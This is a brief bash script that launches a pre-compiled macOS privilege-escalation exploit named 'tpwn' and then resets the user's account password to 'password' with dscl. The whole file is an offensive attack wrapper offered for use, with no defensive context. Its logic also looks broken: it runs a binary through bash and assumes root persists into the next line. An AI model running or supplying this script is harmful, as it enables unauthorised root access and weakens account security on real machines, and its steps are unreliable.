#!/bin/bash

# assumes you have the pre-compiled tpwn binary in the same directory

/bin/bash tpwn

# you are now root, so let's change the password to "password"
dscl . passwd /Users/`whoami` password

exit 0
